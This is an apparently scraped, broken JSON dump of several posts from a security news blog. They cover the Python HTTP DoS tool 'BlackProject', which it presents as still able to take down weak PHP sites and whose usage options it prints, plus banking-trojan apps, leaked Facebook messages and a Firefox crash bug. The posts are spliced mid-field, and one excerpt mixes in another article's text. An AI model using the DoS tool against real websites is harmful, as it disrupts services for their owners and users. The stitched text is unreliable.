A HTTP DoS Tool Written In Python That Works"},"content":{"rendered":"<p>The Black Project, a HTTP DoS tool written in Python. Black Project is a script written in python that executes HTTP based DoS attack on victim&#8217;s website. The packets that are sent on the web server are sent from a single computer which tries to overload website&#8217;s resources by sending fake packets to the apache.<\/p>\n<div id=\"ez-toc-container\" class=\"ez-toc-v2_0_11 counter-hierarchy counter-decimal ez-toc-grey\">\n<div class=\"ez-toc-title-container\">\n<p class=\"ez-toc-title\">Jump To<\/p>\n<span class=\"ez-toc-title-toggle\"><a class=\"ez-toc-pull-right ez-toc-btn ez-toc-btn-xs ez-toc-btn-default ez-toc-toggle\"><i class=\"ez-toc-glyphicon ez-toc-icon-toggle\"><\/i><\/a><\/span><\/div>\n<nav><ul class=\"ez-toc-list ez-toc-list-level-1\"><li class=\"ez-toc-page-1 ez-toc-heading-level-1\"><a class=\"ez-toc-link ez-toc-heading-1\" href=\"https:\/\/theshadowpress.com\/http-dos-tool-written-in-python\/#Introduction\" title=\"Introduction\">Introduction<\/a><\/li><li class=\"ez-toc-page-1 ez-toc-heading-level-1\"><a class=\"ez-toc-link ez-toc-heading-2\" href=\"https:\/\/theshadowpress.com\/http-dos-tool-written-in-python\/#A_HTTP_DoS_Tool_Written_In_Python_That_Works\" title=\"A HTTP DoS Tool Written In Python That Works\">A HTTP DoS Tool Written In Python That Works<\/a><\/li><li class=\"ez-toc-page-1 ez-toc-heading-level-1\"><a class=\"ez-toc-link ez-toc-heading-3\" href=\"https:\/\/theshadowpress.com\/http-dos-tool-written-in-python\/#How_To_Protect_An_Average_Website_Against_BlackProject%E2%80%99s_Attack\" title=\"How To Protect An Average Website Against BlackProject&#8217;s Attack?\">How To Protect An Average Website Against BlackProject&#8217;s Attack?<\/a><\/li><li class=\"ez-toc-page-1 ez-toc-heading-level-1\"><a class=\"ez-toc-link ez-toc-heading-4\" href=\"https:\/\/theshadowpress.com\/http-dos-tool-written-in-python\/#TheBlackProject\" title=\"TheBlackProject\">TheBlackProject<\/a><ul class=\"ez-toc-list-level-2\"><li class=\"ez-toc-heading-level-2\"><a class=\"ez-toc-link ez-toc-heading-5\" href=\"https:\/\/theshadowpress.com\/http-dos-tool-written-in-python\/#Usage\" title=\"Usage\">Usage<\/a><\/li><li class=\"ez-toc-page-1 ez-toc-heading-level-2\"><a class=\"ez-toc-link ez-toc-heading-6\" href=\"https:\/\/theshadowpress.com\/http-dos-tool-written-in-python\/#Utilities\" title=\"Utilities\">Utilities<\/a><\/li><li class=\"ez-toc-page-1 ez-toc-heading-level-2\"><a class=\"ez-toc-link ez-toc-heading-7\" href=\"https:\/\/theshadowpress.com\/http-dos-tool-written-in-python\/#Todo\" title=\"To-do\">To-do<\/a><\/li><li class=\"ez-toc-page-1 ez-toc-heading-level-2\"><a class=\"ez-toc-link ez-toc-heading-8\" href=\"https:\/\/theshadowpress.com\/http-dos-tool-written-in-python\/#LEGAL_NOTICE\" title=\"LEGAL NOTICE\">LEGAL NOTICE<\/a><\/li><\/ul><\/li><\/ul><\/nav><\/div>\n<h1><span class=\"ez-toc-section\" id=\"Introduction\"><\/span><strong>Introduction<\/strong><span class=\"ez-toc-section-end\"><\/span><\/h1>\n<p>The Black Project, also known as a modified version of GoldenEye Python DoS tool. Both the tool, GoldenEye and Black Project works the same except BlackProject has fixed GoldenEye&#8217;s overloading issue. This issue results in attacker&#8217;s computer to crash after the attack is launched.<\/p>\n<h1><span class=\"ez-toc-section\" id=\"A_HTTP_DoS_Tool_Written_In_Python_That_Works\"><\/span><strong>A HTTP DoS Tool Written In Python That Works<\/strong><span class=\"ez-toc-section-end\"><\/span><\/h1>\n<p><img data-attachment-id=\"451\" data-permalink=\"https:\/\/theshadowpress.com\/secure-website-simple-steps\/code-1839406_1920\/\" data-orig-file=\"https:\/\/theshadowpress.com\/wp-content\/uploads\/2018\/09\/code-1839406_1920.jpg\" data-orig-size=\"1920,1281\" data-comments-opened=\"1\" data-image-meta=\"{&quot;aperture&quot;:&quot;4&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;NIKON D800&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;105&quot;,&quot;iso&quot;:&quot;640&quot;,&quot;shutter_speed&quot;:&quot;0.02&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}\" data-image-title=\"code-1839406_1920\" data-image-description=\"\" data-medium-file=\"https:\/\/theshadowpress.com\/wp-content\/uploads\/2018\/09\/code-1839406_1920-300x200.jpg\" data-large-file=\"https:\/\/theshadowpress.com\/wp-content\/uploads\/2018\/09\/code-1839406_1920-1024x683.jpg\" class=\" wp-image-451 aligncenter\" src=\"https:\/\/theshadowpress.com\/wp-content\/uploads\/2018\/09\/code-1839406_1920-300x200.jpg\" alt=\"The Code\" width=\"436\" height=\"290\" srcset=\"https:\/\/theshadowpress.com\/wp-content\/uploads\/2018\/09\/code-1839406_1920-300x200.jpg 300w, https:\/\/theshadowpress.com\/wp-content\/uploads\/2018\/09\/code-1839406_1920-768x512.jpg 768w, https:\/\/theshadowpress.com\/wp-content\/uploads\/2018\/09\/code-1839406_1920-1024x683.jpg 1024w, https:\/\/theshadowpress.com\/wp-content\/uploads\/2018\/09\/code-1839406_1920-696x464.jpg 696w, https:\/\/theshadowpress.com\/wp-content\/uploads\/2018\/09\/code-1839406_1920-1068x713.jpg 1068w, https:\/\/theshadowpress.com\/wp-content\/uploads\/2018\/09\/code-1839406_1920-630x420.jpg 630w, https:\/\/theshadowpress.com\/wp-content\/uploads\/2018\/09\/code-1839406_1920.jpg 1920w\" sizes=\"(max-width: 436px) 100vw, 436px\" \/><\/p>\n<p>BlackProject was initially launched in the year 2016 and hasn&#8217;t been updated so far. However it is still proven to be working against several weak websites.<\/p>\n<p>BlackProject can take down websites having PHP pages. The script sends malicious HTTP requests over PHP and hence, making it slow down. As soon as the PHP script takes more then it&#8217;s configured max_exec time in php.ini, the website goes down with an error &#8220;Gateway Error&#8221; or &#8220;503 Timed Out&#8221;.<\/p>\n<p>Earlier in 2016, the tool was proven to be effective against most of websites including few government websites according to <a href=\"https:\/\/theshadowpress.com\/hackers-group-cobra-command-claims-to-have-taken-down-flipkart\/\">Cobra Command.<\/a><\/p>\n<p>But for now, the tool can be used for personal pentesting. As per ShadowCrypt&#8217;s test against several WordPress websites, the BlackProject still works and can take down fewer PHP based websites.<\/p>\n<h1><span class=\"ez-toc-section\" id=\"How_To_Protect_An_Average_Website_Against_BlackProject%E2%80%99s_Attack\"><\/span><strong>How To Protect An Average Website Against BlackProject&#8217;s Attack?<\/strong><span class=\"ez-toc-section-end\"><\/span><\/h1>\n<p>As already mentioned above, the script tries to overload website&#8217;s resources through the mean of php. Hence, the website can be protected by increasing the value upto two times in php.ini settings. As per ShadowCrypt&#8217;s instructions, website owners can either add Cloudflare&#8217;s protection for the first 2-3 days so that Cloudflare&#8217;s algorithm checks up all possible IPs and block the attack. Or, it is recommended for the website owners to change(double) the values of the\u00a0post_max_size,\u00a0memory_limit,max_input_time and\u00a0max_execution_time. This method has been personally tried and proven to be working.<\/p>\n<hr \/>\n<h1><span class=\"ez-toc-section\" id=\"TheBlackProject\"><\/span>TheBlackProject<span class=\"ez-toc-section-end\"><\/span><\/h1>\n<p>TheBlackProject is a HTTP Layer 7 DoS script which is an upgraded version of GoldenEye. Many bugs have been fixed since last release of GoldenEye.<\/p>\n<p>TheBlackProject is a DoS python script for http. This project is under Team Ultimate Software and Technologies association limited.<\/p>\n<p>Credits :- Manal Shaikh<\/p>\n<h2><span class=\"ez-toc-section\" id=\"Usage\"><\/span><a id=\"user-content-usage\" class=\"anchor\" href=\"https:\/\/github.com\/shieldsec\/BlackProject#usage\" aria-hidden=\"true\"><\/a>Usage<span class=\"ez-toc-section-end\"><\/span><\/h2>\n<pre><code> USAGE: .\/blackproject.py &lt;url&gt; [OPTIONS]\r\n\r\n OPTIONS:\r\n    Flag                  Description                                               Default\r\n    -u, --useragents   File with user-agents to use                     (default: randomly generated)\r\n    -w, --workers      Number of concurrent workers                     (default: 50)\r\n    -s, --sockets      Number of concurrent sockets                     (default: 30)\r\n    -m, --method       HTTP Method to use 'get' or 'post'  or 'random'  (default: get)\r\n    -d, --debug        Enable Debug Mode [more verbose output]          (default: False)\r\n    -h, --help         Shows this help\r\n<\/code><\/pre>\n<h2><span class=\"ez-toc-section\" id=\"Utilities\"><\/span><a id=\"user-content-utilities\" class=\"anchor\" href=\"https:\/\/github.com\/shieldsec\/BlackProject#utilities\" aria-hidden=\"true\"><\/a>Utilities<span class=\"ez-toc-section-end\"><\/span><\/h2>\n<ul>\n<li>util\/getuas.py &#8211; Fetchs user-agent lists from\u00a0<a href=\"http:\/\/www.useragentstring.com\/pages\/useragentstring.php\" rel=\"nofollow\">http:\/\/www.useragentstring.com\/pages\/useragentstring.php<\/a>\u00a0subpages (ex: .\/getuas.py\u00a0<a href=\"http:\/\/www.useragentstring.com\/pages\/Browserlist\/\" rel=\"nofollow\">http:\/\/www.useragentstring.com\/pages\/Browserlist\/<\/a>)\u00a0<em>REQUIRES BEAUTIFULSOUP4<\/em><\/li>\n<li>res\/lists\/useragents &#8211; Text lists (one per line) of User-Agent strings (from\u00a0<a href=\"http:\/\/www.useragentstring.com\/\" rel=\"nofollow\">http:\/\/www.useragentstring.com<\/a>)<\/li>\n<\/ul>\n<h2><span class=\"ez-toc-section\" id=\"Todo\"><\/span><a id=\"user-content-to-do\" class=\"anchor\" href=\"https:\/\/github.com\/shieldsec\/BlackProject#to-do\" aria-hidden=\"true\"><\/a>To-do<span class=\"ez-toc-section-end\"><\/span><\/h2>\n<ul>\n<li>Change from getopt to argparse<\/li>\n<li>Change from string.format() to printf-like<\/li>\n<li>Add more useragents<\/li>\n<li>More sockets options to be added<\/li>\n<li>Packet size and quantities information to be added.<\/li>\n<li>Add more options to attack like SYN, TCP and etc. (Rather then HTTP)<\/li>\n<\/ul>\n<h2><span class=\"ez-toc-section\" id=\"LEGAL_NOTICE\"><\/span><a id=\"user-content-legal-notice\" class=\"anchor\" href=\"https:\/\/github.com\/shieldsec\/BlackProject#legal-notice\" aria-hidden=\"true\"><\/a>LEGAL NOTICE<span class=\"ez-toc-section-end\"><\/span><\/h2>\n<p>THIS SOFTWARE IS PROVIDED FOR EDUCATIONAL USE ONLY! BY USING THIS SOFTWARE YOU AGREE WITH THESE TERMS.<\/p>\n<hr \/>\n<p>Above are the textual form of &#8220;README.md&#8221; mentioned in the github&#8217;s repository. Apps On Google Play Store Can Steal Your Banking Login Details"},"content":{"rendered":"<p>It has been reported and flagged by security researchers from ESET about the list of malicious apps that can steal your banking login details. These apps on Google play store can steal your banking login details.<\/p>\n<div id=\"ez-toc-container\" class=\"ez-toc-v2_0_11 counter-hierarchy counter-decimal ez-toc-grey\">\n<div Those Apps?<\/a><ul class=\"ez-toc-list-level-2\"><li class=\"ez-toc-heading-level-2\"><a class=\"ez-toc-link ez-toc-heading-4\" Against Such Phishing Scams?\">How To Protect Myself Against Such Phishing Scams?<\/a><ul class=\"ez-toc-list-level-6\"><li class=\"ez-toc-heading-level-6\"><ul class=\"ez-toc-list-level-6\"><li class=\"ez-toc-heading-level-6\"><ul class=\"ez-toc-list-level-6\"><li class=\"ez-toc-heading-level-6\"><ul class=\"ez-toc-list-level-6\"><li class=\"ez-toc-heading-level-6\"><a class=\"ez-toc-link title=\"Source\">Source<\/a><\/li><\/ul><\/li><\/ul><\/li><\/ul><\/li><\/ul><\/li><\/ul><\/li><\/ul><\/nav><\/div>\n<h1><span class=\"ez-toc-section\" id=\"These_Apps_On_Google_Play_Store_Can_Steal_Your_Banking_Login_Details\"><\/span>These Apps On Google Play Store Can Steal Your Banking Login Details<span class=\"ez-toc-section-end\"><\/span><\/h1>\n<p>Such apps sends fake text messages from your mobile to extract your sensitive login details. Such apps are disguised behind the niche of\u00a0<strong>battery managers, cleaners, device boosters, and even horoscope-themed apps<\/strong>.<\/p>\n<p><img data-attachment-id=\"493\" data-permalink=\"https:\/\/theshadowpress.com\/these-apps-on-google-play-store-that-can-steal-your-banking-login-details\/warning-36073_1280\/\" data-orig-file=\"https:\/\/theshadowpress.com\/wp-content\/uploads\/2018\/11\/warning-36073_1280.png\" data-orig-size=\"1280,1128\" data-comments-opened=\"1\" data-image-meta=\"{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}\" data-image-title=\"warning-36073_1280\" data-image-description=\"\" data-medium-file=\"https:\/\/theshadowpress.com\/wp-content\/uploads\/2018\/11\/warning-36073_1280-300x264.png\" data-large-file=\"https:\/\/theshadowpress.com\/wp-content\/uploads\/2018\/11\/warning-36073_1280-1024x902.png\" class=\" wp-image-493 aligncenter\" src=\"https:\/\/theshadowpress.com\/wp-content\/uploads\/2018\/11\/warning-36073_1280-300x264.png\" alt=\"Warning\" width=\"450\" height=\"396\" srcset=\"https:\/\/theshadowpress.com\/wp-content\/uploads\/2018\/11\/warning-36073_1280-300x264.png 300w, https:\/\/theshadowpress.com\/wp-content\/uploads\/2018\/11\/warning-36073_1280-768x677.png 768w, https:\/\/theshadowpress.com\/wp-content\/uploads\/2018\/11\/warning-36073_1280-1024x902.png 1024w, https:\/\/theshadowpress.com\/wp-content\/uploads\/2018\/11\/warning-36073_1280-696x613.png 696w, https:\/\/theshadowpress.com\/wp-content\/uploads\/2018\/11\/warning-36073_1280-1068x941.png 1068w, https:\/\/theshadowpress.com\/wp-content\/uploads\/2018\/11\/warning-36073_1280-477x420.png 477w, https:\/\/theshadowpress.com\/wp-content\/uploads\/2018\/11\/warning-36073_1280.png 1280w\" sizes=\"(max-width: 450px) 100vw, 450px\" \/><\/p>\n<p>Usually, such apps pops up a dialog box in your mobile phone with a login page. The login page asks you to enter your login ID to login into your app. When user enters, the hacker gets the details of other apps. The same method is used to do several social engineering tactics in order to extract your ATM security pin by the method of &#8220;guessing&#8221;.<\/p>\n<p>Let&#8217;s take an example of the name of victim to be John. John&#8217;s full name is John Deo and his date of birth if 12th October 1980. John uses his password as 12101980 for Facebook logins and 121080 for Mobile PIN for his banking app access. John uses the password\u00a012101980 which is same as Facebook&#8217;s login into the malicious app and registers over there. The hacker now reads and predicts all the possible password ranges and tries every possible passwords and get access! This is how things are done.<\/p>\n<h1><span class=\"ez-toc-section\" id=\"How_Do_Such_Malicious_Apps_Operate_Their_Scams\"><\/span>How Do Such Malicious Apps Operate Their Scams?<span class=\"ez-toc-section-end\"><\/span><\/h1>\n<p><img data-attachment-id=\"494\" data-permalink=\"https:\/\/theshadowpress.com\/these-apps-on-google-play-store-that-can-steal-your-banking-login-details\/phishing-3390518_1920-1\/\" sizes=\"(max-width: 555px) 100vw, 555px\" \/><\/p>\n<p>Security researchers have found 29 sneaky Trojans that are &#8220;very hard&#8221; to detect. Such Trojans are encrypted in a way that an anti-virus cannot detect or identify it as a &#8220;virus&#8221;.<\/p>\n<p>Such Trojans can be controlled remotely from Hacker&#8217;s device and has ability to access any app on victim&#8217;s computer device.<\/p>\n<p><em>They use\u00a0<strong>customized phishing attacks<\/strong>\u00a0along with activities like intercepting and redirecting text messages to bypass SMS-based two-factor authentication, reading call logs, and downloading as well as the installation of other malicious apps on the compromised device.\u00a0<\/em><\/p>\n<h1><span class=\"ez-toc-section\" id=\"Which_Are_Those_Apps\"><\/span>Which Are Those Apps?<span class=\"ez-toc-section-end\"><\/span><\/h1>\n<p>Here are the list of apps that are reported by the cyber security researchers. If you have any of the apps installed in your device, remove it immediately and change all your login details as soon as possible.<\/p>\n<table class=\"tg\">\n<tbody>\n<tr>\n<th class=\"tg-0lax\"><strong>How to stay safe<\/strong><\/td>\n<\/tr>\n<\/tbody>\n<\/table>\n<p>It is said that the above lists are not yet the full list of apps that steals your data. There might be many more apps doing the same without your consent. So uninstall all malicious\/doubtful apps that act strange in your device. Such &#8220;strange&#8221; behaviour can be like pop up dialog to ask your login and etc. If you found such apps, uninstall them right away.<\/p>\n<p>As soon as you uninstall all malicious apps, you must reset all the login details that are\/were inserted in your mobile phones. So that hackers cannot login into them later even after deletion of these apps.<\/p>\n<h2><span class=\"ez-toc-section\" id=\"How_To_Protect_Myself_Against_Such_Phishing_Scams\"><\/span>How To Protect Myself Against Such Phishing Scams?<span class=\"ez-toc-section-end\"><\/span><\/h2>\n<p>Phishing scams can be very harmful for your online existence as well as your personal life. But sometimes such scams may come so disguised that you can even doubt if that is really a phishing scam or not. So it&#8217;s better to use a strong password. But is that only the solution? No. Use different-different passwords on different websites.<\/p>\n<p>Also Read &#8211; <a href=\"https:\/\/theshadowpress.com\/choosing-strong-password\/\" target=\"_blank\" rel=\"noopener\">How To Choose A Strong Password To Protect My Login Details<\/a><\/p>\n<hr \/>\n<h6><span class=\"ez-toc-section\" id=\"Source\"><\/span><a href=\"https:\/\/fossbytes.com\/these-apps-on-google-play-store-can-steal-your-bank-details\/\" target=\"_blank\" rel=\"nofollow noopener\">Source<\/a><span class=\"ez-toc-section-end\"><\/span><\/h6>\n","protected":false},"excerpt":{"rendered":"<p>It has been reported and flagged by security researchers from ESET about the list of malicious apps that can steal your banking login details. Not exactly hacked, but the account&#8217;s private messages were intercepted by the hackers and the data(s) were stored. The hacker claims to have hacked over 120 million Facebook users personal message.<\/p>\n<p>Also Read &#8211;\u00a0<a href=\"https:\/\/theshadowpress.com\/bug-in-firefox-crash\/\">This Bug In Firefox Can Crash Your Browser In Windows, Linux &amp; Mac<\/a><\/p>\n<div id=\"ez-toc-container\" class=\"ez-toc-v2_0_11 counter-hierarchy counter-decimal ez-toc-grey\">\n<div class=\"ez-toc-title-container\">\n<p class=\"ez-toc-title\">Jump To<\/p>\n<span class=\"ez-toc-title-toggle\"><a class=\"ez-toc-pull-right ez-toc-btn ez-toc-btn-xs ez-toc-btn-default ez-toc-toggle\"><i class=\"ez-toc-glyphicon ez-toc-icon-toggle\"><\/i><\/a><\/span><\/div>\n<nav><ul class=\"ez-toc-list ez-toc-list-level-1\"><li class=\"ez-toc-page-1 ez-toc-heading-level-1\"><a class=\"ez-toc-link ez-toc-heading-1\" href=\"https:\/\/theshadowpress.com\/facebook-users-personal-message-sale\/#Personal_Facebook_Users_Message_Of_Upto_81,000_Are_For_Sale_Online\" title=\"Personal Facebook Users Message Of Upto 81,000 Are For Sale Online\">Personal Facebook Users Message Of Upto 81,000 Are For Sale Online<\/a><\/li><li class=\"ez-toc-page-1 ez-toc-heading-level-1\"><a class=\"ez-toc-link ez-toc-heading-2\" href=\"https:\/\/theshadowpress.com\/facebook-users-personal-message-sale\/#How_Did_BBC_Got_To_Know_About_The_Online_Sale\" title=\"How Did BBC Got To Know About The Online Sale?\">How Did BBC Got To Know About The Online Sale?<\/a><\/li><li class=\"ez-toc-page-1 ez-toc-heading-level-1\"><a class=\"ez-toc-link ez-toc-heading-3\" href=\"https:\/\/theshadowpress.com\/facebook-users-personal-message-sale\/#The_Price_Of_Accounts_That_Were_Put_On_Sale\" title=\"The Price Of Accounts That Were Put On Sale\">The Price Of Accounts That Were Put On Sale<\/a><\/li><li class=\"ez-toc-page-1 ez-toc-heading-level-1\"><a class=\"ez-toc-link ez-toc-heading-4\" href=\"https:\/\/theshadowpress.com\/facebook-users-personal-message-sale\/#How_Did_This_Compromise_Happen_Was_Facebook_Compromised\" title=\"How Did This Compromise Happen? Was Facebook Compromised?\">How Did This Compromise Happen? Was Facebook Compromised?<\/a><\/li><li class=\"ez-toc-page-1 ez-toc-heading-level-1\"><a class=\"ez-toc-link ez-toc-heading-5\" href=\"https:\/\/theshadowpress.com\/facebook-users-personal-message-sale\/#What_Did_Facebook_Say_About_The_Incident\" title=\"What Did Facebook Say About The Incident?\">What Did Facebook Say About The Incident?<\/a><\/li><li class=\"ez-toc-page-1 ez-toc-heading-level-1\"><a class=\"ez-toc-link ez-toc-heading-6\" href=\"https:\/\/theshadowpress.com\/facebook-users-personal-message-sale\/#How_Can_We_Protect_Ourselves_From_Such_Compromise\" title=\"How Can We Protect Ourselves From Such Compromise?\">How Can We Protect Ourselves From Such Compromise?<\/a><\/li><\/ul><\/nav><\/div>\n<h1><span class=\"ez-toc-section\" id=\"Personal_Facebook_Users_Message_Of_Upto_81,000_Are_For_Sale_Online\"><\/span>Personal Facebook Users Message Of Upto 81,000 Are For Sale Online<span class=\"ez-toc-section-end\"><\/span><\/h1>\n<p>Most of the compromised accounts are from Russia followed by Ukraine. Also some USA &amp; UK users are reportedly too be compromised.<\/p>\n<h1><span class=\"ez-toc-section\" id=\"How_Did_BBC_Got_To_Know_About_The_Online_Sale\"><\/span>How Did BBC Got To Know About The Online Sale?<span class=\"ez-toc-section-end\"><\/span><\/h1>\n<p>The\u00a0perpetrators told <a href=\"https:\/\/www.bbc.com\/news\/technology-46065796\">BBC Russian service<\/a> in an online English forum website about the accounts compromised. For verification, the hacker gave over 81,000 accounts to cyber security firm. The firm confirmed that the accounts had private messages.<\/p>\n<p>However, the personal facebook users message that were put on sale was taken offline. In simple words, the advertisement for the sale were taken offline.<\/p>\n<h1><span class=\"ez-toc-section\" id=\"The_Price_Of_Accounts_That_Were_Put_On_Sale\"><\/span>The Price Of Accounts That Were Put On Sale<span class=\"ez-toc-section-end\"><\/span><\/h1>\n<p>Every account has been given a price of one cent. That converts into 0.73 Indian currency. BBC also contacted the infected users for the confirmation of the breach. The Russian users confirmed that the chats were theirs.<\/p>\n<h1><span class=\"ez-toc-section\" id=\"How_Did_This_Compromise_Happen_Was_Facebook_Compromised\"><\/span>How Did This Compromise Happen? Was Facebook Compromised?<span class=\"ez-toc-section-end\"><\/span><\/h1>\n<p>No. Facebook denied that their system wasn&#8217;t compromised. This happened because of an online browser extension unnamed by BBC. The extension closely monitored Facebook user&#8217;s personal details and activities and recorded them.<\/p>\n<h1><span class=\"ez-toc-section\" id=\"What_Did_Facebook_Say_About_The_Incident\"><\/span>What Did Facebook Say About The Incident?<span class=\"ez-toc-section-end\"><\/span><\/h1>\n<p>&#8220;We have contacted browser-makers to ensure that known malicious extensions are no longer available to download in their stores,&#8221; said Facebook&#8217;s Executive, Guy Rosen.<\/p>\n<h1><span class=\"ez-toc-section\" id=\"How_Can_We_Protect_Ourselves_From_Such_Compromise\"><\/span>How Can We Protect Ourselves From Such Compromise?<span class=\"ez-toc-section-end\"><\/span><\/h1>\n<p>As per our personal tips, we would advice you to not install unknown extensions. Or whenever you see any unusual behaviour from your browser like pop ups and other things, better log out of the social media and use your mobile phones instead. Not only about the extension, but also phishing. Beware and do not login into any suspicious websites that claims to giveaway free likes\/followers. 99.9% of such websites store your data which later they put on sale.<\/p>\n","protected":false},"excerpt":{"rendered":"<p>In a BBC Report on 2nd November, it appears that the hackers have hacked more than 81,000 users. Not exactly hacked, but the account&#8217;s private messages were intercepted by the hackers and the data(s) were stored. The hacker claims to have hacked over 120 million Facebook users personal message. News&quot;","img":{"alt_text":"","src":"https:\/\/i0.wp.com\/theshadowpress.com\/wp-content\/uploads\/2019\/05\/JustDial.jpg?resize=350%2C200&ssl=1","width":350,"height":200},"classes":[]}],"_links":{"self":[{"href":"https:\/\/theshadowpress.com\/wp-json\/wp\/v2\/posts\/487"}],"collection":[{"href":"https:\/\/theshadowpress.com\/wp-json\/wp\/v2\/posts"}],"about":[{"href":"https:\/\/theshadowpress.com\/wp-json\/wp\/v2\/types\/post"}],"author":[{"embeddable":true,"href":"https:\/\/theshadowpress.com\/wp-json\/wp\/v2\/users\/1"}],"replies":[{"embeddable":true,"href":"https:\/\/theshadowpress.com\/wp-json\/wp\/v2\/comments?post=487"}],"version-history":[{"count":2,"href":"https:\/\/theshadowpress.com\/wp-json\/wp\/v2\/posts\/487\/revisions"}],"predecessor-version":[{"id":490,"href":"https:\/\/theshadowpress.com\/wp-json\/wp\/v2\/posts\/487\/revisions\/490"}],"wp:featuredmedia":[{"embeddable":true,"href":"https:\/\/theshadowpress.com\/wp-json\/wp\/v2\/media\/489"}],"wp:attachment":[{"href":"https:\/\/theshadowpress.com\/wp-json\/wp\/v2\/media?parent=487"}],"wp:term":[{"taxonomy":"category","embeddable":true,"href":"https:\/\/theshadowpress.com\/wp-json\/wp\/v2\/categories?post=487"},{"taxonomy":"post_tag","embeddable":true,"href":"https:\/\/theshadowpress.com\/wp-json\/wp\/v2\/tags?post=487"}],"curies":[{"name":"wp","href":"https:\/\/api.w.org\/{rel}","templated":true}]}},{"id":471,"date":"2018-09-24T07:37:33","date_gmt":"2018-09-24T07:37:33","guid":{"rendered":"https:\/\/theshadowpress.com\/?p=471"},"modified":"2018-09-24T07:37:33","modified_gmt":"2018-09-24T07:37:33","slug":"bug-in-firefox-crash","status":"publish","type":"post","link":"https:\/\/theshadowpress.com\/bug-in-firefox-crash\/","title":{"rendered":"This Bug In Firefox Can Crash Your Browser In Windows, Linux &#038; Mac"},"content":{"rendered":"<p>The bug in Firefox which has capability to crash. The bug, reported by a security researcher named\u00a0Sabri Haddouche. This bug can not only crash your browser, but also the Operating System on which it is running.<\/p>\n<p>As per <a href=\"https:\/\/www.zdnet.com\/article\/firefox-bug-crashes-your-browser-and-sometimes-your-pc\/\" target=\"_blank\" rel=\"noopener\">ZDNet&#8217;s report<\/a>, this bug in Firefox can force all the major Operating System crash &#8211; Mac, Linux &amp; Windows.<\/p>\n<h1>Bug In Firefox<\/h1>\n<p>It is reported that this bug can crash whole Operating System for those who are running Windows. To overcome this crash, users have to hard reboot their system which may cause data loss. On other hand, Linux &amp; Mac users returns with a dialog popup about sending the crash report to Monzilla Firefox.<\/p>\n<p><a href=\"https:\/\/twitter.com\/pwnsdx\/status\/1043937608861188096\/photo\/1\"><img data-attachment-id=\"472\" data-permalink=\"https:\/\/theshadowpress.com\/bug-in-firefox-crash\/sabri\/\" data-orig-file=\"https:\/\/theshadowpress.com\/wp-content\/uploads\/2018\/09\/sabri.png\" data-orig-size=\"525,757\" data-comments-opened=\"1\" data-image-meta=\"{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}\" data-image-title=\"sabri\" data-image-description=\"\" data-medium-file=\"https:\/\/theshadowpress.com\/wp-content\/uploads\/2018\/09\/sabri-208x300.png\" data-large-file=\"https:\/\/theshadowpress.com\/wp-content\/uploads\/2018\/09\/sabri.png\" class=\"aligncenter wp-image-472\" src=\"https:\/\/theshadowpress.com\/wp-content\/uploads\/2018\/09\/sabri-208x300.png\" alt=\"Bug In Firefox\" width=\"399\" height=\"575\" srcset=\"https:\/\/theshadowpress.com\/wp-content\/uploads\/2018\/09\/sabri-208x300.png 208w, https:\/\/theshadowpress.com\/wp-content\/uploads\/2018\/09\/sabri-291x420.png 291w, https:\/\/theshadowpress.com\/wp-content\/uploads\/2018\/09\/sabri.png 525w\" sizes=\"(max-width: 399px) 100vw, 399px\" \/><\/a><\/p>\n<p>The same test were performed for other devices which has Firefox supported. Mobile phones remained unaffected with iOS &amp; Android. The major reason behind iOS &amp; Android not crashing is because of Quantum Engine of Monzilla Firefox. This leaves iPhone and iPad unaffected from the bug.<\/p>\n<h1>How Does The Bug Works?<\/h1>\n<p>Haddouche explained that the bug contains a script which generates a file (a blob) with an extremely long filename.<\/p>\n<p>The content prompts the program to download it each one millisecond which &#8220;surges the IPC (Inter-Process Communication) channel between Firefox&#8217;s child and principle process,&#8221; and in the long run freezes the program.<\/p>\n<p>This script runs on HTML with a &#8220;&lt;script&gt;&#8221; tagline. You can download the source code of the bug from <a href=\"https:\/\/gist.github.com\/pwnsdx\/d20a99c0500d6f05993ef730bef26746\" target=\"_blank\" rel=\"noopener\">Sadri&#8217;s Github<\/a> repo.<\/p>\n<p>Meanwhile, Mozilla has been notified of this new exploit and has been added to the company\u2019s\u00a0<a href=\"https:\/\/bugzilla.mozilla.org\/show_bug.cgi?id=1493539\" target=\"_blank\" rel=\"nofollow noopener\">bug tracking platform<\/a>. We can expect a fix soon.<\/p>\n<hr \/>\n<p>Thank you for reading with <a href=\"https:\/\/theshadowpress.com\/bug-in-firefox-crash\" target=\"_blank\" rel=\"noopener\">The Shadow Press<\/a>. If you would like to get daily news and tutorial updated in your inbox straightaway. Then you should subscribe to our mailing list which is located at the right sidebar of our website. Just input your Email address &amp; DONE!<\/p>\n","protected":false},"excerpt":{"rendered":"<p>The bug in Firefox which has capability to crash. The bug, reported by a security researcher named\u00a0Sabri Haddouche. This bug can not only crash your browser, but also the Operating System on which it is running. As per ZDNet&#8217;s report, this bug in Firefox can force all the major Operating System crash &#8211; Mac, Linux [&hellip;]<\/p>\n","protected":false},"author":1,"featured_media":473,"comment_status":"open","ping_status":"open","sticky":false,"template":"","format":"standard","meta":{"amp_status":"","spay_email":"","jetpack_publicize_message":""},"categories":[12],"tags":[],"jetpack_featured_media_url":"https:\/\/theshadowpress.com\/wp-content\/uploads\/2018\/09\/firefoxbug.png","jetpack_publicize_connections":[],"yoast_head":"<!-- This site is optimized with the Yoast SEO 